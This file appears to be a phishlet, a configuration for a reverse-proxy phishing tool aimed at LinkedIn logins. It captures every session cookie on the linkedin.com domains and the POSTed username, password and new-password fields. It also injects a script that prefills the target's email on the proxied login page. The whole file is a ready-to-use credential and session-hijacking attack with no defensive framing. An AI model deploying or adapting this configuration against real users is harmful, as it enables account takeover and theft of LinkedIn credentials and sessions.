auth_tokens:
  - domain: '.www.linkedin.com'
    keys: ['.*,regexp']
  - domain: '.linkedin.com'
    keys: ['.*,regexp']
    

auth_urls:
  - '/feed'    
  - '/feed/'
  - '/home'
  - '/home/'
  
credentials:
  username:
    key: 'session_key'
    search: '(.*)'
    type: 'post'
  password:
    key: 'session_password'
    search: '(.*)'
    type: 'post'
  custom:
    - key: 'newPassword'
      search: '(.*)'
      type: 'post'
login:
  domain: 'www.linkedin.com'
  path: '/uas/login'

js_inject:
  - trigger_domains: ["www.linkedin.com"]
    trigger_paths: [""]
    trigger_params: ["email"]
    script: |
      function lp(){
        var email = document.querySelector("#username");
        var password = document.querySelector("#password");
        if (email != null && password != null) {
          email.value = "{email}";
          password.focus();
          return;
        }
        setTimeout(function(){lp();}, 100);
      }
      setTimeout(function(){lp();}, 100);
